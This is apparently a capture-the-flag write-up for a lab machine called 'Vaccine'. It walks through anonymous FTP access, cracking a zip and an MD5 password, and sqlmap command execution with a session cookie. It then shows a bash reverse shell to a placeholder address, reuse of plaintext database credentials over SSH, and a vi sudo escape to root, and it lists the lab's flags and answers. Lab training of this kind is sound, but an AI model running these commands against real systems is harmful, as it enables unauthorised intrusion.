# Vaccine

> IP: [10.129.95.174]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.95.174 -oN init_scan
      1. Port 21 -> ftp
         1. ftp-anon: Anonymous FTP login allowed
            1. -rwxr-xr-x 1 0 0 2533 Apr 13 2021 `backup.zip`
      2. Port 22 -> ssh
      3. Port 80 -> http
3. FTP
   1. Login as anonymous user
      1. > ftp anonymous@10.129.95.174
4. HASH CRACK
   1. Need to run zip2john to generate our hash file that can then be used by john the ripper to crack
      1. > zip2john ./backup.zip > zip.hash
   2. Now crack the hash
      1. > john ./zip.hash --wordlist=/opt/rockyou.txt
         1. RESPONSE: "741852963 (backup.zip)"
   3. ZIP
      1. Now we can unzip our file
         1. > unzip backup.zip
            1. PW: 741852963
               1. We are given a index.php and styles.css file
5. FILES
   1. Looking at the index.php file we see the first section looks to be a login authenticator

        ```php
            session_start();
            if(isset($_POST['username']) && isset($_POST['password'])) {
                if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
                $_SESSION['login'] = "true";
                    header("Location: dashboard.php");
                }
            }
        ```

        1. We can see that it checks for the username = admin, and the password = md5("2cb42f8734ea607eefed3b70af13bbd3")
        2. So lets use throw the hash into crackstation and it should be able to crack it (as md5)
           1. RSEPONSE: `qwerty789`
6. HTTP
   1. Navigate to website
      1. We know the login from the previous steps
         1. UN: admin
         2. PW: qwerty789
   2. Once logged in we see a table with a car catalogue
      1. This has a search input form 
         1. Input "Elixir" and we get just the single row
            1. So this makes me think we need to do some sql-injection
         2. Also upon input we see that the url is changed to "?search=elixir"
            1. TEST LFI "?search=../../../../../../etc/passwd"
               1. No result
7. SQLi
   1. MANUAL TESTING
      1. INPUT_1 (single quote): elixir' and #
         1. RESPONSE: ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%elixir' and #%' ^
            1. This is helpful as it gives us the rough SQL structure
      2. INPUT_2 (double quote): elixir" and #
         1. RESPONSE: nothing
   2. SQLMAP
      1. Now lets try using sqlmap to see if we can find a foothold
         1. > sqlmap -h
            1. We see to get command execution it is `--os-shell`
      2. Craft sqlmap command
         1. Because we login (authenticate) we should pass the cookie through our sqlmap command
         2. > sqlmap -u "http://10.129.95.174/dashboard.php?search=query" --cookie="PHPSESSID=o77tgl64oijua74j4arprig369"
            1. [INFO] the back-end DBMS is PostgreSQL
      3. Now lets rerun this but with --os-shell
         1. > sqlmap -u "http://10.129.95.174/dashboard.php?search=query" --cookie="PHPSESSID=o77tgl64oijua74j4arprig369" --os-shell
            1. SUCCESS! Now lets try and get a revshell that is more stable
               1. > bash -c "bash -i >& /dev/tcp/MY_IP_ADDR/1234 0>&1"
                  1. SUCCESS! Now stabilize revshell
8. ENUMERATION
   1. > whoami
      1. postgres
   2. Search for user flag
      1. > find / -name user.txt 2>/dev/null
         1. /var/lib/postgresql/user.txt
      2. > cat /var/lib/postgresql/user.txt
         1. FLAG: `ec9b13ca4d6229cd5cc1e09980965bf7`
   3. Search webapp (website) files for credentials?
      1. > ls /var/www/html
         1. > cat dashboard.php

            ```php
                try {
                    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
                }
            ```

            1. In here we can see a postgres connection with username and password credentiala
               1. UN: postgres
               2. PW: P@s5w0rd!
            2. Maybe we can use these to ssh in as postgres with this password
9. SSH
   1. SSH in as postgres user
      1. > ssh postgres@10.129.95.174
         1. PW:P@s5w0rd!
10. ENUMERATION PT.2
    1. POSTGRES
       1. Now as the postgres user lets check sudo privileges (if any)
          1. > sudo -l

                ```text
                    Matching Defaults entries for postgres on vaccine:
                        env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
                        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

                    User postgres may run the following commands on vaccine:
                        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
                ```

                1. So we can run `vi` as root on the pg_hba.conf
11. EXPLOIT
    1. GTFOBins
       1. vi
          1. In here we can see that once we are in the program (vi) we can use the following to get a shell
             1. :set shell=/bin/bash
             2. :shell
    2. Run commands
       1. SUCCESS!
    3. ROOT
       1. Get root flag
          1. > cat /root/root.txt
             1. FLAG: `dd6e058e814260bc70e9bbdef2715849`

## QUESTIONS

1. Besides SSH and HTTP, what other service is hosted on this box?
   1. `ftp`
2. This service can be configured to allow login with any password for specific username. What is that username?
   1. `anonymous`
3. What is the name of the file downloaded over this service?
   1. `backup.zip`
4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
   1. `zip2john`
5. What is the password for the admin user on the website?
   1. `qwerty789`
6. What option can be passed to sqlmap to try to get command execution via the sql injection?
   1. `--os-shell`
7. What program can the postgres user run as root using sudo?
   1. `vi`
8. Submit user flag
   1. `ec9b13ca4d6229cd5cc1e09980965bf7`
9. Submit root flag
   1. `dd6e058e814260bc70e9bbdef2715849`
